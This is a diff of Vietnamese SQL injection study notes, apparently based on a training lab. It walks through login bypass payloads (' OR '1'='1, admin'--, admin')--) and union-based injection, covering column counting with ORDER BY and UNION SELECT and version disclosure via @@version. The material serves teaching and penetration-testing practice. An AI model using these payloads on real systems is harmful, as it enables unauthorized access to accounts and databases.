@@ -316,18 +316,146 @@ SELECT * FROM logins WHERE username='admin' OR '1'='1' AND password='something';
 
 - Với logic này, người tấn công có thể đăng nhập mà không cần biết mật khẩu thực tế. Điều kiện `'1'='1'` đảm bảo truy vấn luôn thành công, bất kể mật khẩu nhập vào.
 
-### Sử Dụng OR trong Trường Mật Khẩu
+### Auth Bypass with OR operator
 
-Nếu không biết tên người dùng hợp lệ, chúng ta có thể sử dụng phương pháp tương tự với trường mật khẩu:
+- Nếu không biết tên người dùng hợp lệ, chúng ta có thể sử dụng phương pháp tương tự với trường mật khẩu:
 
 ```sql
 ' OR '1'='1
 ```
 
-Câu truy vấn sẽ trở thành:
+- Câu truy vấn sẽ trở thành:
 
 ```sql
 SELECT * FROM logins WHERE username='anyUser' AND (password='' OR '1'='1');
 ```
 
-Điều này dẫn đến việc truy vấn trả về tất cả các bản ghi trong bảng và cấp quyền đăng nhập cho người đầu tiên trong danh sách.
+- Điều này dẫn đến việc truy vấn trả về tất cả các bản ghi trong bảng và cấp quyền đăng nhập cho người đầu tiên trong danh sách.
+
+## Using Comments
+
+- SQL cũng hỗ trợ sử dụng bình luận, tương tự như nhiều ngôn ngữ lập trình khác. Bình luận giúp tài liệu hóa truy vấn hoặc bỏ qua một phần truy vấn không cần thiết. 
+- MySQL cho phép sử dụng hai kiểu bình luận dòng là `--` và `#`. Ngoài ra, cũng có thể dùng bình luận nội tuyến `/ * */`, tuy nhiên kiểu này ít được sử dụng trong các cuộc tấn công SQL Injection.
+
+### Comments
+
+- Bình luận kiểu `--` được sử dụng như sau:
+```sql
+SELECT username FROM logins; -- Chỉ lấy tên đăng nhập từ bảng logins
+```
+- Kết quả:
+```plaintext
++---------------+
+| username      |
++---------------+
+| admin         |
+| administrator |
+| john          |
+| tom           |
++---------------+
+```
+- Lưu ý: Sau `--` cần có khoảng trống (space) để bắt đầu bình luận. Trong URL, khoảng trống được mã hóa thành `+`, ví dụ: `--+`.
+
+- Bình luận kiểu `#` cũng được hỗ trợ:
+```sql
+SELECT * FROM logins WHERE username = 'admin'; # Phần này bị bỏ qua
+```
+
+- Kết quả:
+```plaintext
++----+----------+----------+---------------------+
+| id | username | password | date_of_joining     |
++----+----------+----------+---------------------+
+|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
++----+----------+----------+---------------------+
+```
+- Tip: Khi nhập payload vào URL trong trình duyệt, ký hiệu `#` sẽ bị coi là thẻ và không được truyền trong URL. Để sử dụng `#`, hãy mã hóa thành `%23`.
+
+### Auth Bypass with comments
+
+- Trong ví dụ trước, chúng ta có thể sử dụng payload `admin'--` làm tên người dùng. Truy vấn sẽ trở thành:
+```sql
+SELECT * FROM logins WHERE username='admin'-- ' AND password='something';
+```
+- Phần `AND password='something'` bị bỏ qua nhờ bình luận, giúp đảm bảo truy vấn không có lỗi cú pháp.
+
+- Thử trên trang đăng nhập với tên người dùng là `admin'--` và mật khẩu bất kỳ:
+  - Kết quả: Bỏ qua xác thực thành công, truy vấn chỉ kiểm tra `username='admin'`.
+
+### Some example
+
+- SQL hỗ trợ sử dụng dấu ngoặc đơn để ưu tiên kiểm tra một số điều kiện. 
+- Ví dụ:
+```sql
+SELECT * FROM logins WHERE (id > 1) AND username='admin';
+```
+- Truy vấn trên đảm bảo chỉ những ID lớn hơn `1` mới được kiểm tra.
+
+- Nếu không cân bằng dấu ngoặc, truy vấn sẽ bị lỗi cú pháp. Để sửa lỗi, thêm dấu ngoặc đóng trong payload:
+```sql
+admin')--
+```
+- Kết quả:
+```sql
+SELECT * FROM logins WHERE (username='admin')
+```
+- Truy vấn trả về thông tin người dùng `admin`.
+
+## Union Injection
+
+- Khi đã hiểu cách sử dụng câu lệnh Union, chúng ta có thể áp dụng nó trong tấn công SQL Injection. Ví dụ minh họa sau đây:
+
+    ```url
+    http://SERVER_IP:PORT/search.php?port_code=cn
+    ```
+
+- Chúng ta nhận thấy có khả năng SQL Injection thông qua tham số tìm kiếm. Tiến hành kiểm tra bằng cách chèn một dấu `'`:
+
+    ```url
+    http://SERVER_IP:PORT/search.php?port_code=cn'
+    ```
+
+- Kết quả xuất hiện lỗi, chứng tỏ trang web dễ bị tấn công SQL Injection. Đây là một trường hợp lý tưởng để sử dụng Union-based Injection.
+
+### Detect number of columns
+
+- Trước khi khai thác, cần xác định số cột trong bảng bằng một trong hai cách:
+
+1. **Using ORDER BY**:
+
+    - Chèn lần lượt `order by 1`, `order by 2`,... cho đến khi gặp lỗi.
+
+    ```sql
+    ' order by 1-- -
+    ' order by 2-- -
+    ```
+
+    - Khi lệnh `order by 5` trả về lỗi, điều đó nghĩa là bảng có 4 cột.
+
+2. **Using UNION**:
+
+    - Chèn thử một câu truy vấn Union với số lượng cột khác nhau.
+
+    ```sql
+    cn' UNION select 1,2,3-- -
+    ```
+
+    - Nếu lệnh trên lỗi, thử với 4 cột:
+    ```sql
+    cn' UNION select 1,2,3,4-- -
+    ```
+
+    - Khi kết quả trả về thành công, nghĩa là bảng có 4 cột.
+
+### Location of Injection
+
+- Một truy vấn có thể trả về nhiều cột, nhưng không phải tất cả đều được hiển thị. Cần xác định cột nào in kết quả trên trang.
+
+    - Ví dụ: Với truy vấn Union trả về `1, 2, 3, 4`, trang chỉ hiển thị `2, 3, 4`.
+    - Để kiểm tra, sử dụng truy vấn sau và thay đổi nội dung cột:
+
+    ```sql
+    cn' UNION select 1,@@version,3,4-- -
+    ```
+
+    - Nếu cột thứ 2 hiển thị, kết quả sẽ in ra phiên bản cơ sở dữ liệu.
